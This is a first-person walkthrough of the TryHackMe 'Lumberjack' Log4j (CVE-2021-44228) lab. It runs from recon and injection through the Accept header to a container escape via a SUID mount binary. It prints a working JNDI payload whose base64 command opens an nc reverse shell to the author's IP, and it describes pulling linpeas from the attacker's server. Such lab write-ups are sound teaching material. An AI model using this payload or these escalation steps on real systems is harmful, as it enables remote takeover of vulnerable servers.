Hello everyone this is my first ctf writeup. Name of the box is Lumberjack from tryhackme, it’s based on Log4j (CVE-2021-44228) it is a medium level challenge.

Created by : SilverStr

Let’s start with basic recons

Recon:

nmap -sC -sV -Pn 10.10.120.161

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.001.png)

Results from nmap showed 2 open ports

In ssh there is nothing to see so went to check up the http port 80.

\--------------------------------------------------------------------------------------------------------------------------------------

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.002.png)

Nothing to see in this port. After that I used burp to capture the request of this site.

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.003.png) 

They give a resource to refer the log4j vulnerability. 

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.004.png)

**References used to make this room:**

- [Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
- Malicious LDAP servers are fun. (Come on.... work for it a bit)

I send the request to repeater and I used basic payload of log4j to manipulate the request via the user agent but I didn’t get any proper response. 

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.005.png)

I saw the accept “request header” in burp .so, I decided to send the payload via the accept header.

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.006.png)

I got the proper response via this accept header.

Let’s try to get shell using JNDIexploit...

Java -jar JNDIExlpoit-1.2-SNAPSHOT.jar -u

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.007.png)

I used this payload for the reverse shell via nc.

Let’s set the exploit:

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.008.png)

Reverse shell payload to base 64.

${jndi:ldap://10.8.19.239:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjguMTkuMjM5IDQ0NDQgPi90bXAvZg==}


![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.009.png)

I send the payload via the accept header. 

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.010.png)

Finally, I got the shell. Let’s find the 1st flag;

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.011.png)

It’s a docker environment... I go to the opt directory for flag’s 

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.012.png)![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.013.png)![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.014.png)



I got the 1st flag …

cat .flag1 

Let’s check for 2nd flag, after long time I decide to use linpease to know vulnerabilities.

I will set the python server to get the linpeas from my machine to that vuln machine.

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.015.png)

Let’s give the execute permission to the linpeas chmod +x linpeas.sh and run the linpeas

I saw the suid unmount in the bin directory..

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.016.png)

Let’s see what is in dev directory, I found some directories which is unmounted on disk.

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.017.png)  

Make the empty directory in the tmp directory ‘123’ to mount it. 

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.018.png)

After that I will go to the root directory which is on mounted folder ‘123’

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.019.png)






On the root directory I saw the root.txt, but here I got depressed. 

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.020.png) 

After few moments I saw the directory which is ‘…’ 

cd …;ls -la

cat .\_fLaG2

![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.021.png)![image](/lumberjack/img/Aspose.Words.b75ce199-092b-4751-a9a2-ba6f523f07c9.022.png)

At last, I found the final flag. A wonderful medium level ctf to know what is log4j and how its working





`                          `……….….…………….Happy learning & Hunting ………………………




